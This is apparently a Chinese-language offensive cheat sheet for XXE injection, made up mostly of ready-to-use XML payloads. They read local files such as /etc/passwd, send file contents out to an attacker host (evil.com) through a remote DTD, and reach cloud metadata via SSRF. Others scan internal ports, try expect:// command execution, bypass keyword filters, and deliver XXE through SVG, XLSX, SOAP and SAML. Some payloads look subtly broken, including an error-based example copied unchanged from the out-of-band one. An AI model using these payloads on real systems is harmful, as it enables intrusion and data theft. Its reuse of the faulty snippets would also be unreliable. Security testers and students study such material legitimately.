# XXE (XML External Entity)

## 原理

XML 解析器在解析 XML 时会处理外部实体（DTD 中的 `ENTITY`），攻击者构造恶意 XML 让解析器读取本地文件、发起网络请求、甚至执行代码。

## 攻击链

### 1. 探测 XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe "test">
]>
<root>&xxe;</root>
```

如果响应中包含 "test"，说明实体被解析。

### 2. 读取文件

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

#### Windows

```xml
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
```

#### PHP 源码（base64 编码避免解析错误）

```xml
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/config.php">
```

### 3. Blind XXE（无回显）

#### 通过 OOB（Out-of-Band）

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
  %dtd;
  %send;
]>
<root>test</root>
```

evil.dtd:
```xml
<!ENTITY % all
  "<!ENTITY send SYSTEM 'http://evil.com/?data=%file;'>"
>
%all;
```

#### 报错 XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
  %dtd;
  %send;
]>
<root>test</root>
```

evil.dtd:
```xml
<!ENTITY % all
  "<!ENTITY send SYSTEM 'file:///nonexistent/%file;'>"
>
%all;
```

报错信息会包含文件内容。

### 4. SSRF 攻击

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

### 5. 内网端口扫描

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:22/">
]>
<root>&xxe;</root>
```

通过响应时间或错误信息判断端口是否开放。

### 6. 命令执行（罕见，需特定环境）

#### PHP expect

```xml
<!ENTITY xxe SYSTEM "expect://id">
```

#### Java + XSLT

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="document(concat('http://evil.com/?data=',encode-for-uri(document('file:///etc/passwd'))))"/>
  </xsl:template>
</xsl:stylesheet>
```

## 各语言 XXE

### Java

```xml
# 常见库：DocumentBuilder, SAXParser, XMLReader, Unmarshaller
# 默认可能开启外部实体

# 利用
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);  # 防护
```

### PHP

```xml
# libxml < 2.9 默认开启
# PHP 8.0+ 默认关闭

# 利用
simplexml_load_string($xml);
# 防护
libxml_disable_entity_loader(true);
```

### Python

```python
# lxml 默认不解析外部实体
# 但如果显式开启：
from lxml import etree
parser = etree.XMLParser(resolve_entities=True)
tree = etree.parse(StringIO(xml), parser)

# pulldom, xml.dom.pulldom 可能受影响
```

### .NET

```csharp
# XmlDocument 默认解析外部实体（.NET 4.5.2 之前）
XmlDocument doc = new XmlDocument();
doc.LoadXml(xml);

# .NET 4.5.2+ 默认安全
```

### Ruby

```ruby
# REXML 默认安全
# 但如果配置了：
REXML::Document.new(xml, {:raw => :all})
```

## 绕过技巧

### 1. 关键字过滤

```xml
# 过滤 SYSTEM
<!ENTITY xxe PUBLIC "any" "file:///etc/passwd">

# 过滤 DOCTYPE
# 使用 XInclude
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>

# 过滤 ENTITY
# 使用参数实体
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">
  %xxe;
]>
```

### 2. 编码绕过

```xml
# UTF-16
<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

# UTF-16BE / UTF-16LE
# 用 iconv 转换
iconv -f UTF-8 -t UTF-16BE payload.xml > payload_utf16.xml
```

### 3. 协议利用

```xml
# PHP
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://internal/">

# Java
<!ENTITY xxe SYSTEM "jar:http://evil.com/evil.jar!/file.txt">
<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">
<!ENTITY xxe SYSTEM "http://evil.com/">  # 也可用于 SSRF

# .NET
<!ENTITY xxe SYSTEM "http://evil.com/">
```

### 4. 参数实体利用

```xml
# 当普通实体被过滤，但参数实体可用
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

### 5. 本地 DTD 利用（无网络时）

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  %local_dtd;
]>
<root>test</root>
```

常见本地 DTD 路径：
- `/usr/share/yelp/dtd/docbookx.dtd`
- `/usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd`
- `/opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd`
- `C:\Windows\System32\wbem\xml\CIM20.DTD`

## 2024-2026 新技术点

### 1. SVG 中的 XXE

```xml
# 上传 SVG 文件触发 XXE
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text x="10" y="20">&xxe;</text>
</svg>
```

### 2. XLSX / DOCX 中的 XXE

```bash
# XLSX 文件本质是 ZIP，包含 XML
# 修改 xl/workbook.xml 添加 XXE
unzip spreadsheet.xlsx
# 编辑 xl/workbook.xml
# 添加 DOCTYPE
zip -r malicious.xlsx .
```

### 3. SOAP 中的 XXE

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <soap:Body>
    <data>&xxe;</data>
  </soap:Body>
</soap:Envelope>
```

### 4. SAML 中的 XXE

```xml
# SAML Response 是 XML，可能存在 XXE
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  ...
</samlp:Response>
```

### 5. PDF 生成中的 XXE

```xml
# 某些 PDF 生成库支持 XML 输入
# Apache FOP
# 通过 XSL-FO 注入 XXE
```

### 6. GraphQL 中的 XXE

```xml
# 某些 GraphQL 实现支持 XML 输入
# 通过 mutation 的 XML 参数注入
```

### 7. Java 新 gadget

```xml
# 利用 Java 的 jar 协议
<!ENTITY xxe SYSTEM "jar:http://evil.com/evil.jar!/file.txt">

# 利用 Java 的 netdoc 协议
<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">
```

### 8. 现代 XML 库的新问题

```xml
# libxml2 2.12+ 的新特性
# 某些库对 XInclude 的处理变化
```

## 工具推荐

- **XXExploiter** — 生成 XXE payload
- **XXEinjector** — XXE 自动化
- **dtd-finder** — 找本地 DTD
- **Burp Collaborator** — OOB 检测

## 参考链接

- [PortSwigger XXE](https://portswigger.net/web-security/xxe)
- [PayloadsAllTheThings - XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
- [Timur Lundkvist - XXE Local DTD](https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/)
